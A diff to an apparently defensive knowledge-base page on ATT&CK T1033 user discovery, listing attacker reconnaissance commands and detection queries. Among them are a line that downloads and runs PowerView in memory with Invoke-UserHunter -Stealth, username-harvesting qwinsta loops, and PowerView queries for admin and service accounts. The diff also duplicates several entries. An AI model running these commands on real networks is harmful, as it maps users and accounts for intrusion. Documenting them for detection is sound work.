@@ -30,8 +30,8 @@ Utilities and commands that acquire this information include <code>whoami</code>
 
 ```
 whoami /all /fo list
-shell whoami /all /fo list
 getuid
+shell whoami /all /fo list
 cmd.exe /C whoami
 wmic useraccount get /ALL
 quser /SERVER:"localhost"
@@ -40,20 +40,19 @@ qwinsta.exe /server:localhost
 qwinsta.exe
 for /F "tokens=1,2" %i in ('qwinsta /server:localhost ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
 @FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
-
 users
 w
 who
-
 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1'); Invoke-UserHunter -Stealth -Verbose
-
-{'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'custom_parser_vals': {'json_key': 'samaccountname', 'json_type': 'str'}}]}, 'payloads': ['powerview.ps1']}}}
-{'darwin': {'sh': {'command': 'whoami\n'}}, 'linux': {'sh': {'command': 'whoami\n'}}, 'windows': {'psh': {'command': 'whoami\n'}}}
-{'darwin': {'sh': {'command': 'whoami', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}}, 'linux': {'sh': {'command': 'whoami', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}}, 'windows': {'psh': {'command': '$env:username\n', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}, 'cmd': {'command': 'echo %username%', 'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'}, {'source': 'domain.user.name'}]}}}}
-{'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n', 'parsers': {'plugins.stockpile.app.parsers.json': [{'source': 'domain.user.name', 'custom_parser_vals': {'json_key': 'samaccountname', 'json_type': 'str'}}]}, 'payloads': ['powerview.ps1']}}}
+Import-Module .\powerview.ps1 -Force;
+Get-NetUser -AdminCount | ConvertTo-Json -Depth 1
+whoami
+$env:username
+whoami
+echo %username%
+Import-Module .\powerview.ps1 -Force;
+Get-NetUser -SPN | ConvertTo-Json -Depth 1
 powershell/situational_awareness/network/bloodhound
-powershell/situational_awareness/network/bloodhound
-powershell/situational_awareness/network/powerview/get_session
 powershell/situational_awareness/network/powerview/get_session
 ```
 
@@ -91,43 +90,33 @@ powershell/situational_awareness/network/powerview/get_session
              'Invoke-UserHunter -Stealth -Verbose\n',
   'name': None,
   'source': 'atomics/T1033/T1033.yaml'},
- {'command': {'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 '
-                                             '-Force;\n'
-                                             'Get-NetUser -AdminCount | '
-                                             'ConvertTo-Json -Depth 1\n',
-                                  'parsers': {'plugins.stockpile.app.parsers.json': [{'custom_parser_vals': {'json_key': 'samaccountname',
-                                                                                                             'json_type': 'str'},
-                                                                                      'source': 'domain.user.name'}]},
-                                  'payloads': ['powerview.ps1']}}},
+ {'command': 'Import-Module .\\powerview.ps1 -Force;\n'
+             'Get-NetUser -AdminCount | ConvertTo-Json -Depth 1\n',
   'name': 'Get Administrator users for a computer',
   'source': 'data/abilities/discovery/aaf34d82-aea9-4278-8ec4-789653e4f5d9.yml'},
- {'command': {'darwin': {'sh': {'command': 'whoami\n'}},
-              'linux': {'sh': {'command': 'whoami\n'}},
-              'windows': {'psh': {'command': 'whoami\n'}}},
+ {'command': 'whoami\n',
   'name': 'Obtain user from current session',
   'source': 'data/abilities/discovery/bd527b63-9f9e-46e0-9816-b8434d2b8989.yml'},
- {'command': {'darwin': {'sh': {'command': 'whoami',
-                                'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
-                                                                                    {'source': 'domain.user.name'}]}}},
-              'linux': {'sh': {'command': 'whoami',
-                               'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
-                                                                                   {'source': 'domain.user.name'}]}}},
-              'windows': {'cmd': {'command': 'echo %username%',
-                                  'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
-                                                                                      {'source': 'domain.user.name'}]}},
-                          'psh': {'command': '$env:username\n',
-                                  'parsers': {'plugins.stockpile.app.parsers.basic': [{'source': 'host.user.name'},
-                                                                                      {'source': 'domain.user.name'}]}}}},
+ {'command': 'whoami\n',
+  'name': 'Obtain user from current session',
+  'source': 'data/abilities/discovery/bd527b63-9f9e-46e0-9816-b8434d2b8989.yml'},
+ {'command': 'whoami\n',
+  'name': 'Obtain user from current session',
+  'source': 'data/abilities/discovery/bd527b63-9f9e-46e0-9816-b8434d2b8989.yml'},
+ {'command': 'whoami',
   'name': 'Find user running agent',
   'source': 'data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml'},
- {'command': {'windows': {'psh': {'command': 'Import-Module .\\powerview.ps1 '
-                                             '-Force;\n'
-                                             'Get-NetUser -SPN | '
-                                             'ConvertTo-Json -Depth 1\n',
-                                  'parsers': {'plugins.stockpile.app.parsers.json': [{'custom_parser_vals': {'json_key': 'samaccountname',
-                                                                                                             'json_type': 'str'},
-                                                                                      'source': 'domain.user.name'}]},
-                                  'payloads': ['powerview.ps1']}}},
+ {'command': 'whoami',
+  'name': 'Find user running agent',
+  'source': 'data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml'},
+ {'command': '$env:username\n',
+  'name': 'Find user running agent',
+  'source': 'data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml'},
+ {'command': 'echo %username%',
+  'name': 'Find user running agent',
+  'source': 'data/abilities/discovery/c0da588f-79f0-4263-8998-7496b1a40596.yml'},
+ {'command': 'Import-Module .\\powerview.ps1 -Force;\n'
+             'Get-NetUser -SPN | ConvertTo-Json -Depth 1\n',
   'name': 'Get Service Accounts for a domain',
   'source': 'data/abilities/discovery/f1cf4ea1-43f0-4604-9537-3d1b1b2d5b1c.yml'},
  {'command': 'powershell/situational_awareness/network/bloodhound',
@@ -210,7 +199,52 @@ powershell/situational_awareness/network/powerview/get_session
            '"whoami.exe"or process_command_line contains "whoami"or '
            'file_directory contains "useraccount get /ALL"or process_path '
            'contains "qwinsta.exe"or process_path contains "quser.exe"or '
-           'process_path contains "systeminfo.exe")'}]
+           'process_path contains "systeminfo.exe")'},
+ {'name': 'Yml',
+  'product': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}',
+  'query': 'Yml\n'
+           'title: system owner / user found\n'
+           'description: windows server 2016 / Ubuntu19.04\n'
+           'references: https://attack.mitre.org/techniques/T1033/\n'
+           'tags: T1033\n'
+           'status: experimental\n'
+           'author: 12306Bro\n'
+           'logsource:\n'
+           '    product: windows\n'
+           '    service: security\n'
+           'detection:\n'
+           '    selection1:\n'
+           '        EventID: 4688 # have created a new process.\n'
+           "        Newprocessname: 'C: \\ windows \\ system32 \\ whoami.exe' "
+           '# process information> new process name\n'
+           "        Creatorprocessname: 'C: \\ windows \\ system32 \\ cmd.exe' "
+           '# Process Information> Creator Process Name\n'
+           '        Processcommandline: whoami # Process information> process '
+           'command line\n'
+           '    selection2:\n'
+           "        EventID: 4703 # a user's privileges to be adjusted.\n"
+           "        ProcessName: 'C: \\ Windows \\ System32 \\ whoami.exe' # "
+           'process information> process name\n'
+           "        EnabledPrivileges: 'SeDebugPrivilege' permission enabled "
+           '#\n'
+           '    selection3:\n'
+           '        EventID: 4689 # exited process\n'
+           "        ProcessName: 'C: \\ Windows \\ System32 \\ whoami.exe' # "
+           'process information> process name\n'
+           '        Exitstatus: 0x0 # Process information> exit status\n'
+           '    timeframe: last 1m # can be adjusted according to actual '
+           'situation\n'
+           '    condition: all of them\n'
+           'level: low\n'
+           'logsource:\n'
+           '    product: linux\n'
+           '    service: history\n'
+           'detection:\n'
+           '    keywords:\n'
+           '       - w\n'
+           '       - who\n'
+           '    condition: keywords\n'
+           'level: low'}]
 ```
 
 ## Raw Dataset
